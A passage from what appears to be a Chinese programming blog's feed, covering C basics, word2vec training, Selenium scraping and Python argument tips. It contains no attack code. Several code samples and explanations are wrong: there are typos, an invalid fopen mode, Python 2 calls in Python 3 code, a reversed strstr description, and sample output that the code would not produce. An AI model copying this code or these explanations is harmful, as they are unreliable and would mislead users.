&lt;td style="text-align:left">strlen(s);&lt;/td>
&lt;td style="text-align:left">获取字符串s长度&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">strcmp(s1,s2);&lt;/td>
&lt;td style="text-align:left">如果 s1 和 s2 是相同的，则返回 0；如果 s1&amp;lt;s2 则返回小于 0；如果 s1&amp;gt;s2 则返回大于 0。（这里的s1 s2基于字符数组内的字符的字典序判定）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">strchr(s1,ch);&lt;/td>
&lt;td style="text-align:left">返回一个指针，只想字符串s1中字符ch第一次出现的位置&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">strstr(s1,s2);&lt;/td>
&lt;td style="text-align:left">返回一个指针，指出字符串s1在字符串s2中年第一次出现的位置&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;li>
&lt;p>重点&lt;/p>
&lt;/li>
&lt;li>
&lt;p>sizeof()与strlen()函数对字符串的差别&lt;/p>
&lt;/li>
&lt;li>
&lt;p>sizeof()函数获取变量所占空间大小&lt;/p>
&lt;/li>
&lt;li>
&lt;p>strlen()获取字符串长度&lt;/p>
&lt;p>sizeof()函数是可以对任何变量使用的，但是strlen()是字符串专属函数&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
int main(){
char name[]=&amp;#34;xiaoming&amp;#34;;
printf(&amp;#34;size of name=%d\n&amp;#34;,sizeof(name));
printf(&amp;#34;strlen of name=%d\n&amp;#34;,strlen(name));
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>size of name=9
strlen of name=8
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>strlen()函数统计字符数组内存储的字符串长度并且不包括截止符&lt;/li>
&lt;li>sizeof()函数统计字符数组所占的空间大小！&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>补充:&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
int main(){
char name[20]=&amp;#34;xiaoming&amp;#34;;
printf(&amp;#34;size of name=%d\n&amp;#34;,sizeof(name));
printf(&amp;#34;strlen of name=%d\n&amp;#34;,strlen(name));
return 0;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>size of name=20
strlen of name=8
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;ol>
&lt;li>
&lt;h3 id="结构体">结构体&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>有的时候你可能在想，我需要在程序里存储一个人，或者多个人的身份数据，包括姓名，年龄，出生年月一类的时候咋办？我们当然会希望把这些数据放在一起组织起来，而不是用N多个变量分别存储。于是！结构体就应运而生。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>我们直接以上面的例子来：情景假设我们要存储一个班级学生的信息。&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
//首先定义一个结构体DATE来存储出生年月
struct DATE{
short year; //年
short month;//月
short day; //日
};
//定义学生信息结构体StudentInfo
struct StudentInfo{
char name[20]={0}; //姓名
DATE date; //出生年月，对!结构体也可以嵌套定义
};
//对，我们要存储一个班的学生，50人
StudentInfo student[50];
for (int i=0;i&amp;lt;50;i++){
printf(&amp;#34;输入第%d个学生信息：\n&amp;#34;,i+1);
//我们使用结构体名称加“.”的方式来访问结构体内部元素
printf(&amp;#34;学生姓名：&amp;#34;); scanf(&amp;#34;%s&amp;#34;,&amp;amp;student[i].name);
printf(&amp;#34;学生出生年月日：&amp;#34;);
scanf(
&amp;#34;%d-%d-%d&amp;#34;,
&amp;amp;student[i].date.year,
&amp;amp;student[i].date.month,
&amp;amp;student[i].date.day
);
};
for (int i=0;i&amp;lt;50;i++){
printf(&amp;#34;%s\n&amp;#34;,student[i].name);
printf(
&amp;#34;%d-%d-%d&amp;#34;,
student[i].date.year,
student[i].date.month,
student[i].date.day
);
};
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输入&lt;/p>
&lt;pre tabindex="0">&lt;code>输入第1个学生信息：
学生姓名：xiaoming
学生出生年月日：1992-12-21
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>xiaoming
1992-12-21
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>我们通过如下格式声明结构体&lt;/p>
&lt;pre tabindex="0">&lt;code>struct 结构体类型名{
基本数据类型 变量名;
基本数据类型 变量名;
...
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>结构体的声明，其实只是定义了一个由用户个人定义的一种数据类型，我们真正要使用的时候还需要重新真正声明一个结构体实际变量.正如上面代码例子中给出的那样。&lt;/li>
&lt;li>除了上述的声明结构体实际变量的写法，我们还有如下几种其他方式&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>//如此我们在声明一个DATE结构体类型的同时，声明了一个date的结构体实体变量
stuct DATE{
int year;
int month;
int day;
}date;
//如果我们并不打算在别的地方使用这种结构体类型，只是单纯的为了声明这样一个结构体实体变量，还可以省略结构体类型名称
struct{
int year;
int month;
}date1;
//这个还是定义一个结构体类型DATE
typedef stuct{
int year;
int month;
}DATE;
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;ol>
&lt;li>
&lt;h3 id="枚举结构">枚举结构&lt;/h3>
&lt;p>&lt;del>这是本垃圾博主很少使用的一种结构&lt;/del>&lt;/p>
&lt;pre tabindex="0">&lt;code>enum WEEK{
Monday=1,
Tuesday,
Wednesday,
Thursday,
Friday,
Saturday,
Sunday
}
WEEK day;
/*
你也可以使用这种写法多写一个单词
enum WEEK day;
当然也可以像结构体一样声明枚举类型，到实体化枚举变量一气呵成
enum WEEK{
Monday=1,
Tuesday,
Wednesday,
Thursday,
Friday,
Saturday,
Sunday
} day;
*/
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>第一个枚举类型成员值默认为整形0，后续枚举成员默认值为前一个成员+1.&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>enum season {spring, summer=3, autumn, winter};
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>没有指定值的枚举元素，其值为前一元素加 1。也就说 spring 的值为 0，summer 的值为 3，autumn 的值为 4，winter 的值为 5&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="指针">指针&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;del>无数萌新惨死在这里&lt;/del>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>指针是一种变量类型，这种类型可以存储另一个变量的地址，地址即另一个变量在内存中的位置&lt;/p>
&lt;/li>
&lt;li>
&lt;p>你可以使用指针里存储的地址来访问另一个变量的值，修改另一个变量&lt;/p>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;h3 id="声明方法">声明方法&lt;/h3>
&lt;pre tabindex="0">&lt;code>基础数据类型 *变量名
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>举例1：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>int *p0;
short *p1;
long *p2;
char *p3;
float *p4;
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>基本的数据类型都可以声明其对应的指针变量&lt;/p>
&lt;/li>
&lt;li>
&lt;p>一种类型的指针变量只可以存储对应类型变量的地址。列如int*型的指针变量，所存储的地址指向的位置必定存储的也是一个int型的数据&lt;/p>
&lt;/li>
&lt;li>
&lt;p>举例2：&lt;/p>
&lt;pre tabindex="0">&lt;code>struct TEST{
int a,b;
};
TEST* p0;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>我们也可以声明一个结构体类型，并且声明一个指向该结构体类型的指针变量&lt;/p>
&lt;hr>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;h3 id="指针使用">指针使用&lt;/h3>
&lt;ul>
&lt;li>基本使用&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
int *p=NULL; //声明指针变量，并初始化为NULL（即0）NULL是C语言里约定的空指针值
int a; //声明一个正常整形变量
a=1; //将a赋值为1
p=&amp;amp;a; //将a的地址赋值给指针变量
//&amp;amp; 符号，取变量的地址
printf(&amp;#34;a=%d\np=%p\n*p=%d&amp;#34;,a,p,*p);
a=22; //改变a的值
printf(&amp;#34;\na=%d\np=%p\n*p=%d&amp;#34;,a,p,*p);
return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>样例输出&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>a=1 //a的值
p=000000000062FE44 //p的值，即a的地址
*p=1 //p所指向的地址所存储的值，即a的值
a=22
p=000000000062FE44 //同上
*p=22
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>&lt;a href="http://www.runoob.com/cprogramming/c-pointers.html">更多c语言指针相关教程&lt;/a>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="文件操作">文件操作&lt;/h2>
&lt;ul>
&lt;li>程序是用了来处理数据的，而数据实质就是存储在磁盘上的文件，因而文件操作是程序员必须学习的基础&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>FILE *f=NULL; //声明一个文件指针
char buff[100]; //声明一个字符串数组
char ch; //声明一个字符变量
int x; //声明一个整形变量
f=fopen(&amp;#34;test.txt&amp;#34;,&amp;#34;wr&amp;#34;); //打开文件，“wr”指定可读可写
ch=fgetc(f); //从文件中读取单个字符赋值给ch
fscanf(f,&amp;#34;%s&amp;#34;,buff); //从文件中读取字符串赋值给buff字符串数组
fscanf(f,&amp;#34;%d&amp;#34;,&amp;amp;x); //从文件中读取一个整形变量
fgets(buff,100,f); //从文件中读取字符串，并存放到buff中，指定最大长度100
fprintf(f,&amp;#34;%s\n&amp;#34;,buff); //向文件中写入字符串数组
fputc(ch,f); //向文件中写入单个字符
fputs(buff,f); //向文件中写入字符串
&lt;/code>&lt;/pre>&lt;h2 id="后记">后记&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>指针我这里暂时咕了，指针可以说是c语言的精髓，也意味着贯穿了整个c语言的所有内容，如果完成指针部分可能又花当前篇幅的一半。所以这里只有一个最最最基础的指针使用。如果你还需要详细的指针学习，推荐你前往&lt;a href="http://www.runoob.com/cprogramming/c-pointers.html">这里&lt;/a>,或许之后我也可能会把指针单独独立的讲解一次。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>写着整个教程花了我接近三天的时间，而且越是到后面意志越是消沉（所以我写到指针咕咕咕了）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>而且我知道这样实在是一个写的不怎么样的教程。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>本教程尽量挑选了基础性的，使用较为常见的知识点进行讲解，并以本人自认为合适的一种顺序组织安排了全部内容&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果这篇博客能帮到你，非常高兴。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果觉得博客有问题，欢迎邮件交流。&lt;/p>
&lt;/li>
&lt;/ul></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/c/c-/">C/C++</category></item><item><title>word2vec词向量训练</title><link>https://yuukisama.cc/posts/code/word2vec%E8%AF%8D%E5%90%91%E9%87%8F%E8%AE%AD%E7%BB%83/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/word2vec%E8%AF%8D%E5%90%91%E9%87%8F%E8%AE%AD%E7%BB%83/</guid><pubDate>Wed, 13 Mar 2019 10:26:22 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;blockquote>
&lt;h2 id="概述">概述&lt;/h2>
&lt;/blockquote>
&lt;ul>
&lt;li>
&lt;p>最近踩坑机器学习神经网络中的文本处理,所以有了这篇博客.记录一下基于python word2vec训练中文词向量的方法(英文也同样适用)
&lt;del>虽然事后我发现我需要的并不是词向量word2vec,而是训练获得句子向量的方法,权当做个预告吧(咕咕咕)&lt;/del>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>词向量训练:在自然语言处理中将每个单词映射到一个空间向量过程,从而获得每个词汇之间的关联性.(可能说的不太对,大概就这样吧,不是理论帝)&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="0.jpg" alt=" 少数正经的图">&lt;/p>
&lt;h2 id="start">Start&lt;/h2>
&lt;ul>
&lt;li>python:3.5+&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>安装相应依赖&lt;/p>
&lt;pre tabindex="0">&lt;code>pip install jieba
pip install gensim
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>jieba用于中文文本分词,英文可直接使用空格分割分词&lt;/li>
&lt;li>gensim词向量训练模块&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>数据预处理&lt;/p>
&lt;pre tabindex="0">&lt;code>def load():
with open(&amp;#34;./train.tsv&amp;#34;,&amp;#34;r&amp;#34;,encoding=&amp;#34;utf-8&amp;#34;) as f:
lines=f.readlines()
f.close()
return lines
return None
&lt;/code>&lt;/pre>&lt;p>这里采用的数据格式是以'\t'分割的tsv文件,每一行包含一个句子以及其对应标签.这里将二者共同训练&lt;/p>
&lt;/li>
&lt;li>
&lt;p>分词并去除停止词&lt;/p>
&lt;ul>
&lt;li>停止词:指句子中的语气词,特殊符号,数字等对句子意义判别无帮助的词汇,这里推荐几个常用的中文停止词表,你也可以一句自己项目需要自己制作适合的停止词表&lt;a href="https://github.com/goto456/stopwords">Github&lt;/a>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code># 导入结巴分词
import jieba
# 读取停止词表函数,停止词表为一行一个的格式
def load_stopwords():
with open(&amp;#34;./stopwords.txt&amp;#34;,&amp;#34;r&amp;#34;,encoding=&amp;#34;utf-8&amp;#34;) as f:
words=f.readlines()
f.close()
return words
return None
# 装载停止词表
stopowrds=load_stopwords()
# 分词去除停止词函数,lines为上一步中读取的单行数据,将所有的分词保存到文本文件中为下一步训练备用
def cut(lines):
with open(&amp;#34;cutwords.txt&amp;#34;,&amp;#34;w+&amp;#34;,encoding=&amp;#34;utf-8&amp;#34;) as f:
for line in lines:
words=jieba.cut(line)
#去除停止词
for i in words:
if i in stopwords:
words.remove(i)
f.write(&amp;#34; &amp;#34;.join(words))
f.wirte(&amp;#34;\n&amp;#34;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>模型训练&lt;/p>
&lt;pre tabindex="0">&lt;code># 导入词向量训练模块
from gensim.models import word2vec
from gensim.models.word2vec import LineSentence
# 训练函数
def model_train(
sentence_in=sentence, # 需要训练的数据
size_in=300, # 生成的词向量维数,训练数据量越大,推荐数值越大
window_in=5, # 滑动窗口大小,涉及到单个词语关联前后单词的数目
min_count_in=2, # 字典截断,出现次数少于该数值的词汇会被放弃
iter_in=5 # 迭代次数
):
print(&amp;#34;start traing...&amp;#34;)
model=word2vec.Word2Vec(
sentences=sentence_in,
size=size_in,
window=window_in,
min_count=min_count_in,
workers=multiprocessing.cpu_count(),
iter=iter_in
)
print(&amp;#34;traing complete...&amp;#34;)
return model
# 从之前完成分词的数据中装载训练数据,模型sentence参数可以是一个list
# 但是大批量数据时建议使用word2vec自带的类型导入
sentence=LineSentence(&amp;#34;./cutwords.txt&amp;#34;)
model=model_train(sentence,300,5,2,5)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>保存模型&lt;/p>
&lt;pre tabindex="0">&lt;code># 参数为保存的文件名
model.save(&amp;#34;modeltest&amp;#34;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>模型的二次训练&lt;/p>
&lt;pre tabindex="0">&lt;code># 读取模型
model = gensim.models.Word2Vec.load(&amp;#39;modeltest&amp;#39;)
# 追加训练
model.train(more_sentences)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>模型使用&lt;/p>
&lt;pre tabindex="0">&lt;code># 根据给定的词汇给出10个最相近的词汇
model.most_similar(&amp;#34;男人&amp;#34;)
# 找出离群词
model.doesnt_match(&amp;#34;测试&amp;#34;)
# 计算两个词汇相似度
model.similarity(&amp;#39;男人&amp;#39;, &amp;#39;女人&amp;#39;)
# 获得单个词汇的词向量
model[&amp;#39;男人&amp;#39;]
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/python/">Python</category><category domain="https://yuukisama.cc/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">机器学习</category></item><item><title>高阶爬虫selenium摘记</title><link>https://yuukisama.cc/posts/code/%E9%AB%98%E9%98%B6%E7%88%AC%E8%99%ABselenium%E6%91%98%E8%AE%B0/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/%E9%AB%98%E9%98%B6%E7%88%AC%E8%99%ABselenium%E6%91%98%E8%AE%B0/</guid><pubDate>Fri, 08 Mar 2019 14:46:18 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h2 id="概述">概述&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>本文记录一些有关python高阶爬虫selenium+浏览器爬虫操作的踩坑记录.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>selenium&lt;/p>
&lt;p>本质是一个为了自动化测试而诞生的工具,但没想到ta自身作为一个爬虫也是极具优势的.&lt;/p>
&lt;p>selenium简单的说就是通过各种webdirver驱动去控制浏览器去访问网站,完成各种操作,从而达到爬取数据的目的.可以有效的规避多数反爬虫机制,列如用js动态生成的网站&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="selenium.jpeg" alt="">&lt;/p>
&lt;h2 id="start">Start&lt;/h2>
&lt;p>python version:3.5+&lt;/p>
&lt;p>browser:Chrome&lt;/p>
&lt;p>webdriver:chromedriver&lt;/p>
&lt;p>platform:Windows 10&lt;/p>
&lt;ol>
&lt;li>
&lt;p>首先安装selenium包&lt;/p>
&lt;pre tabindex="0">&lt;code>pip install selenium
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>在命令行中尝试引入selenium库,如果不报错证明安装成功&lt;/p>
&lt;pre tabindex="0">&lt;code>import selenium
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>依据你准备选用的浏览器下载对应版本的webdriver.本文以chrome浏览器为例,依据chrome浏览器版本下载对应的chromedriver&lt;/p>
&lt;p>&lt;a href="https://npm.taobao.org/mirrors/chromedriver">chromedriver download&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>关于webdriver的配置.&lt;/p>
&lt;p>webdriver事实上是一个可执行文件,为了能够让程序调用它,所以需要配置其环境变量.win下最偷懒的方法自然是把ta丢进system32里.&lt;/p>
&lt;p>当然有高阶操作可以装载指定目录中的webdriver,以及可以指定浏览器可执行文件目录等,这部分操作参见自定义webdriver以及浏览器可执行文件&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>让我们开始第一个例子打开百度首页&lt;/p>
&lt;pre tabindex="0">&lt;code>#-*- coding:utf-8 -*-
# 从selenium包中导入webdriver
from selenium import webdriver
# 声明一个chrome对象
dirver=webdriver.Chrome()
# 用chrome打开百度首页
driver.get(&amp;#34;https://www.baidu.com/&amp;#34;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://blog.csdn.net/yj1556492839/article/details/79671008">更多基础操作&lt;/a>&lt;/p>
&lt;p>&lt;del>容我偷个懒&lt;/del>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="advance">Advance&lt;/h2>
&lt;p>&lt;del>其实也就是一系列踩坑行为&lt;/del>&lt;/p>
&lt;ol>
&lt;li>
&lt;h3 id="自定义webdriver以及浏览器可执行文件">自定义webdriver以及浏览器可执行文件&lt;/h3>
&lt;pre tabindex="0">&lt;code>#-*- coding:utf-8 -*-
from selenium import webdirver
# 声明一个chrome设置对象
options=webdriver.ChromeOptions()
# 指定浏览器可执行文件路径
options._binary_location=&amp;#34;./Application/chrome.exe&amp;#34;
# 利用chrome设置对形象作为参数初始化webdriver对象,executable_path即webdriver路径
chrome=webdriver.Chrome(chrome_options=options,executable_path=&amp;#34;./chromedriver.exe&amp;#34;)
# 打开百度首页
chrome.get(&amp;#34;https://www.baidu.com/&amp;#34;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>&lt;strong>不指定浏览器可执行文件目录,默认启动系统浏览器.个人拙见为了软件的移植性下载32位版本的二进制可执行文件放在脚本下属目录,使用参数指定浏览器可执行文件路径&lt;/strong>&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;h3 id="设置浏览器启动参数">设置浏览器启动参数&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>普通参数&lt;/p>
&lt;pre tabindex="0">&lt;code>#-*- coding:utf-8 -*-
from selenium import webdirver
# 声明一个chrome设置对象
options=webdriver.ChromeOptions()
# 禁用gpu加速
options.add_argument(&amp;#34;--disable-gpu&amp;#34;)
# 允许加载不安全内容
options.add_argument(&amp;#39;--allow-running-insecure-content&amp;#39;)
# 禁用插件
options.add_argument(&amp;#39;--disable-extensions&amp;#39;)
# 使用无头浏览器,即不显示浏览器图形化界面,适用于没有图形化界面的服务器
options.add_argument(&amp;#39;--headless&amp;#39;)
chrome=webdriver.Chrome(chrome_options=options)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>实验性参数&lt;/p>
&lt;pre tabindex="0">&lt;code>appState = {
&amp;#34;recentDestinations&amp;#34;: [ {
&amp;#34;id&amp;#34;: &amp;#34;Save as PDF&amp;#34;,
&amp;#34;origin&amp;#34;: &amp;#34;local&amp;#34;
} ],
&amp;#34;selectedDestinationId&amp;#34;: &amp;#34;Save as PDF&amp;#34;,
&amp;#34;version&amp;#34;: 2
}
profile = {
&amp;#39;printing.print_preview_sticky_settings.appState&amp;#39;: json.dumps(appState)
}
options.add_experimental_option(&amp;#34;prefs&amp;#34;,profile)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://peter.sh/experiments/chromium-command-line-switches/">更多启动参数设置参见文档&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>执行JavaScript脚本&lt;/p>
&lt;pre tabindex="0">&lt;code>#-*- coding:utf-8 -*-
from selenium import webdirver
chrome=webdriver.Chrome()
# 设置js代码执行超时时间
chrome.set_script_timeout(30)
chrome.get(&amp;#34;http://www.baidu.com/&amp;#34;)
# 异步执行js代码
chrome.execute_script(&amp;#34;alert(&amp;#34;Halloworld&amp;#34;);&amp;#34;)
# 阻塞执行js代码
chrome.execute_async_script(&amp;#34;alert(&amp;#34;halloworld&amp;#34;);&amp;#34;)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>execute_script函数是异步执行js代码.&lt;/li>
&lt;li>execute_async_script是阻塞执行,即会等待js执行完成再执行接下来的程序.&lt;/li>
&lt;li>set_script_timeout是设置js执行超时时间,对于阻塞执行的js代码,在timeout设定的时间内没有能够完成将强行终止.这个timeout值默认是30s&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/python/">Python</category><category domain="https://yuukisama.cc/tags/%E7%88%AC%E8%99%AB/">爬虫</category><category domain="https://yuukisama.cc/tags/selenium/">selenium</category></item><item><title>Python常用Skill</title><link>https://yuukisama.cc/posts/code/python%E5%B8%B8%E7%94%A8skill/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/python%E5%B8%B8%E7%94%A8skill/</guid><pubDate>Fri, 25 Jan 2019 17:01:19 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h2 id="python常用技能汇总">Python常用技能汇总&lt;/h2>
&lt;ul>
&lt;li>这里是一些写python脚本时常用的小技巧,长期更新
&lt;del>咕咕咕&lt;/del>&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="Python.jpg" alt="Python娘,来源于萌娘百科">&lt;/p>
&lt;hr>
&lt;h3 id="获取脚本目录">获取脚本目录&lt;/h3>
&lt;ul>
&lt;li>脚本运行时相对路径时基于命令行的路径.这样直接在脚本里使用相对路径会出现问题.我们可以使用如下方法获得脚本所在的绝对路径,以及脚本本身的文件名.
&lt;pre tabindex="0">&lt;code>import os
WORK_PATH,FILE_NAME=os.path.split(os.path.abspath(__file__))
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>WORK_PATH中就存储了脚本所在的绝对路径&lt;/li>
&lt;li>FILE_NAME中就是脚本名称&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="获取windows用户目录">获取Windows用户目录&lt;/h3>
&lt;ul>
&lt;li>有时我们需要获取用户默认的下载目录,或者是文档目录等等
&lt;pre tabindex="0">&lt;code>import os
USER_PATH=os.path.expanduser(&amp;#34;~&amp;#34;)
DOWNLOAD_PATH=ps.path.join(os.path.expanduser(&amp;#34;~&amp;#34;),&amp;#34;Download&amp;#34;)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>USER_PATH中存储了用户目录的绝对路径&lt;/li>
&lt;li>DOWNLOAD_PATH中存储了用户默认下载目录(如果用户没有自己重命名这个文件夹的话)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="python参数传递中的args以及kwargs">Python参数传递中的*args以及**kwargs&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>事实上真正的python参数传递语法是* 和 **。*args和**kwargs是我们一种约定俗成的写法。&lt;/p>
&lt;/li>
&lt;li>
&lt;h4 id="args">*args&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>*args用来表示函数接受可变长度的 &lt;strong>非关键字&lt;/strong> 参数作为函数的输入&lt;/p>
&lt;pre tabindex="0">&lt;code>def test(normal_arg, *args):
print(&amp;#34;first normal arg:&amp;#34;+normal_arg)
for i,x in enumerate(args):
print(&amp;#34;{} arg is {}&amp;#34;.format(i+1,x))
test(&amp;#34;normal&amp;#34;,&amp;#34;a&amp;#34;,&amp;#34;b&amp;#34;,&amp;#34;c&amp;#34;,&amp;#34;d&amp;#34;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>first normal arg:normal
1 arg is a
2 arg is b
3 arg is c
4 arg is d
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;h4 id="kwargs">**kwargs&lt;/h4>
&lt;ul>
&lt;li>**kwargs表示函数接受可变长度的关键字参数字典作为参数，即可以简单的理解为传入的是字典参数
&lt;pre tabindex="0">&lt;code>def test(**kwargs):
if kwargs is not None:
for key, value in kwargs.iteritems():
print(&amp;#34;{} = {}&amp;#34;.format(key,value))
# Or you can visit kwargs like a dict() object
# for key in kwargs:
# print(&amp;#34;{} = {}&amp;#34;.format(key, kwargs[key]))
test(name=&amp;#34;python&amp;#34;, value=&amp;#34;5&amp;#34;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>样例输出
&lt;pre tabindex="0">&lt;code>name = python
value = 5
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;h4 id="whats-more">What's more&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>我们也可以使用这两个参数来调用一般参数格式的函数&lt;/p>
&lt;pre tabindex="0">&lt;code>def func(arg1,arg2,arg3):
print(&amp;#34;arg1: &amp;#34; + arg1)
print(&amp;#34;arg2: &amp;#34; + arg2)
print(&amp;#34;arg3: &amp;#34; + arg3)
args_list=(&amp;#34;python&amp;#34;,2,3)
func(*args_list)
print(&amp;#34;==================&amp;#34;)
kwargs_dict={&amp;#34;arg3&amp;#34;: 3, &amp;#34;arg1&amp;#34;: &amp;#34;python&amp;#34;, &amp;#34;arg2&amp;#34;: 2}
func(**kwargs_dict)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>样例输出:&lt;/p>
&lt;pre tabindex="0">&lt;code>arg1: python
arg2: 2
arg3: 3
==================
arg1: python
arg2: 2
arg3: 3
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>本段参考简书 &lt;a href="https://www.jianshu.com/p/be92113116c8">https://www.jianshu.com/p/be92113116c8&lt;/a>&lt;/p>
&lt;/li>
